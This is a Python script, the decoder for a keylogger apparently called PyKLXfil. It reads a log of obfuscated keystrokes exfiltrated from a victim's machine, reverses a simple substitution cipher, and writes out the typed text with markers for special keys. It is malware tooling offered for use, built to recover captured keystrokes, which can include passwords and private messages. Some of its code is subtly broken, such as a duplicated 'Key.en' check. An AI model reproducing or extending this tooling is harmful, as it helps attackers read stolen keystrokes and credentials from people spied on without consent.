#PyKLXfil Decoder, decodes exfiltrated file from client
#### DECODER ####
# -*- coding: utf-8 -*-
#Auther: 2021, Mayed Alm
import re
import sys

banner = '''
______      _   __ _     __   __ __ _ _ 
| ___ \    | | / /| |    \ \ / // _(_) |
| |_/ /   _| |/ / | |     \ V /| |_ _| |
|  __/ | | |    \ | |     /   \|  _| | |
| |  | |_| | |\  \| |____/ /^\ \ | | | |
\_|   \__, \_| \_/\_____/\/   \/_| |_|_| Decoder
       __/ |  ©id4rksid3            v1.0
      |___/                             
    '''

def cleanFile(file):
    print(f"\nDecoding...{file}")
    try:
        with open(file, "r") as fin:
            fin = fin.read()
            with open(f"Decoded-{file}", "a") as fout:
                p = re.findall(r"[A-Za-z0-9+/.!@[#$%^&*()-_=+{}'\]]{21}",fin)
                for i in p:
                    x = substitution(i[10:16])
                    if x == "Key.en":
                        fout.writelines("\n")
                    elif x == "Key.sp":
                        fout.writelines(" ")
                    elif x == "Key.ba":
                        fout.writelines("<BKS>")
                    elif x == "Key.ta":
                        fout.writelines("<TAB>")
                    elif x == "Key.up":
                        fout.writelines("<UP>")
                    elif x == "Key.do":
                        fout.writelines("<DWN>")
                    elif x == "Key.le":
                        fout.writelines("<LFT>")
                    elif x == "Key.ri":
                        fout.writelines("<RHT>")
                    elif x == "Key.sh":
                        fout.writelines("<SHFT>")
                    elif x == "Key.de":
                        fout.writelines("<DEL>")
                    elif x == "Key.ho":
                        fout.writelines("<HOM>")
                    elif x == "Key.en":
                        fout.writelines("<END>")
                    elif x == "Key.f1":
                        fout.writelines("<F1>")
                    elif x == "Key.f2":
                        fout.writelines("<F2>")
                    elif x == "Key.f3":
                        fout.writelines("<F3>")
                    elif x == "Key.f4":
                        fout.writelines("<F4>")
                    elif x == "Key.f5":
                        fout.writelines("<F5>")
                    elif x == "Key.f6":
                        fout.writelines("<F6>")
                    elif x == "Key.f7":
                        fout.writelines("<F7>")
                    elif x == "Key.f8":
                        fout.writelines("<F8>")
                    elif x == "Key.f9":
                        fout.writelines("<F9>")
                    elif x == "Key.ct":
                        fout.writelines("<CTL>")                
                    else:
                        fout.writelines(x[0])
    except FileNotFoundError:
        sys.exit("\n[!] File not found!")

#func to perform very basic substitution cipher
def substitution(str):
    Table = str.maketrans("01234567ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv\\wxyz/+89%^&*()$.,#@!-'[]=_",\
                          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk\\lmnopqrstuvwxyz0123456789+/!@#$%^&*()-_=][.,'")
    return str.translate(Table)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        sys.exit("[!] Usage: PyKLXfil-decoder.py logxxxx.log")
    elif len(sys.argv) > 2:
        sys.exit("[!] Usage: PyKLXfil-decoder.py logxxxx.log")
    else:
        print(banner)
        cleanFile(sys.argv[1])
